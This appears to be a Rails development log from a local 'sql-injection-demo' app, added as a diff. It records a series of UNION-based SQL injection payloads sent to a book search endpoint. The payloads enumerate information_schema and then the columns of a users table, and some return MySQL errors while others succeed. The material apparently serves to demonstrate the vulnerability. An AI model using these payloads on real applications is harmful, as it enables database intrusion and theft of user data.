+  Rendered books/index.html.erb within layouts/application (43.4ms)
+Completed 200 OK in 107ms (Views: 55.6ms | ActiveRecord: 41.3ms)
+
+
+Started GET "/books/search?keyword=non-exist-string%25%27+UNION+SELECT+1%2C+information_schema.columns%2C+1%2C+1+FROM+table_name+%3D+%27sql-injection-demo_development%27+--+" for 127.0.0.1 at 2017-09-30 18:47:50 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"non-exist-string%' UNION SELECT 1, information_schema.columns, 1, 1 FROM table_name = 'sql-injection-demo_development' -- "}
+  [1m[36mBook Load (0.3ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT 1, information_schema.columns, 1, 1 FROM table_name = 'sql-injection-demo_development' -- %'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.3ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''sql-injection-demo_development' -- %'' at line 1: SELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT 1, information_schema.columns, 1, 1 FROM table_name = 'sql-injection-demo_development' -- %'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.6ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (64.8ms)
+Started GET "/books/search?keyword=non-exist-string%25%27+UNION+SELECT+1%2C+table_name%2C+table_schema%2C+1%2C+1+FROM+information_schema.columns+--+" for 127.0.0.1 at 2017-09-30 18:48:22 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"non-exist-string%' UNION SELECT 1, table_name, table_schema, 1, 1 FROM information_schema.columns -- "}
+  [1m[36mBook Load (41.8ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT 1, table_name, table_schema, 1, 1 FROM information_schema.columns -- %'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (49.8ms)
+Completed 200 OK in 109ms (Views: 62.7ms | ActiveRecord: 41.8ms)
+
+
+Started GET "/books/search?keyword=non-exist-string%25%27+UNION+SELECT+1%2C+information_schema.columns%2C+1%2C+1+FROM+information_schema+where+table_name+%3D+%27sql-injection-demo_development%27+--+" for 127.0.0.1 at 2017-09-30 18:48:24 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"non-exist-string%' UNION SELECT 1, information_schema.columns, 1, 1 FROM information_schema where table_name = 'sql-injection-demo_development' -- "}
+  [1m[36mBook Load (0.4ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT 1, information_schema.columns, 1, 1 FROM information_schema where table_name = 'sql-injection-demo_development' -- %'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.4ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: Table 'sql-injection-demo_development.information_schema' doesn't exist: SELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT 1, information_schema.columns, 1, 1 FROM information_schema where table_name = 'sql-injection-demo_development' -- %'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.5ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.3ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (61.3ms)
+Started GET "/books/search?keyword=non-exist-string%25%27+UNION+SELECT+1%2C+information_schema.columns%2C+1%2C+1+FROM+information_schema.columns+where+table_name+%3D+%27sql-injection-demo_development%27+--+" for 127.0.0.1 at 2017-09-30 18:48:42 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"non-exist-string%' UNION SELECT 1, information_schema.columns, 1, 1 FROM information_schema.columns where table_name = 'sql-injection-demo_development' -- "}
+  [1m[36mBook Load (0.5ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT 1, information_schema.columns, 1, 1 FROM information_schema.columns where table_name = 'sql-injection-demo_development' -- %'[0m
+Completed 500 Internal Server Error in 1ms (ActiveRecord: 0.5ms)
+
+
+  
+ActiveRecord::StatementInvalid (Mysql2::Error: Unknown column 'information_schema.columns' in 'field list': SELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT 1, information_schema.columns, 1, 1 FROM information_schema.columns where table_name = 'sql-injection-demo_development' -- %'):
+  
+app/controllers/books_controller.rb:13:in `search'
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_source.html.erb (2.5ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_trace.html.erb (1.0ms)
+  Rendering /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/_request_and_response.html.erb (0.5ms)
+  Rendered /Users/james/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/actionpack-5.0.6/lib/action_dispatch/middleware/templates/rescues/diagnostics.html.erb within rescues/layout (60.3ms)
+Started GET "/books/search?keyword=non-exist-string%25%27+UNION+SELECT+1%2C+column_name%2C+data_type%2C+1%2C+1+FROM+information_schema.columns+where+table_name+%3D+%27sql-injection-demo_development%27+--+" for 127.0.0.1 at 2017-09-30 18:49:33 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"non-exist-string%' UNION SELECT 1, column_name, data_type, 1, 1 FROM information_schema.columns where table_name = 'sql-injection-demo_development' -- "}
+  [1m[36mBook Load (0.6ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT 1, column_name, data_type, 1, 1 FROM information_schema.columns where table_name = 'sql-injection-demo_development' -- %'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.4ms)
+Completed 200 OK in 13ms (Views: 11.8ms | ActiveRecord: 0.6ms)
+
+
+Started GET "/books/search?keyword=non-exist-string%25%27+UNION+SELECT+1%2C+column_name%2C+data_type%2C+1%2C+1+FROM+information_schema.columns+where+table_name+%3D+%27users%27+--+" for 127.0.0.1 at 2017-09-30 18:49:43 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"non-exist-string%' UNION SELECT 1, column_name, data_type, 1, 1 FROM information_schema.columns where table_name = 'users' -- "}
+  [1m[36mBook Load (1.1ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT 1, column_name, data_type, 1, 1 FROM information_schema.columns where table_name = 'users' -- %'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (4.5ms)
+Completed 200 OK in 18ms (Views: 16.2ms | ActiveRecord: 1.1ms)
+
+
+Started GET "/books/search?keyword=non-exist-string%25%27+UNION+SELECT+1%2C+column_name%2C+data_type%2C+1%2C+1+FROM+information_schema.columns+where+table_name+%3D+%27users%27+AND+table_schema+%3D+%27sql-injection-demo_development%27+--+" for 127.0.0.1 at 2017-09-30 18:50:38 +0800
+Processing by BooksController#search as HTML
+  Parameters: {"keyword"=>"non-exist-string%' UNION SELECT 1, column_name, data_type, 1, 1 FROM information_schema.columns where table_name = 'users' AND table_schema = 'sql-injection-demo_development' -- "}
+  [1m[36mBook Load (0.4ms)[0m  [1m[34mSELECT * FROM books WHERE title LIKE '%non-exist-string%' UNION SELECT 1, column_name, data_type, 1, 1 FROM information_schema.columns where table_name = 'users' AND table_schema = 'sql-injection-demo_development' -- %'[0m
+  Rendering books/index.html.erb within layouts/application
+  Rendered books/index.html.erb within layouts/application (0.9ms)
+Completed 200 OK in 15ms (Views: 13.8ms | ActiveRecord: 0.4ms)
+
+
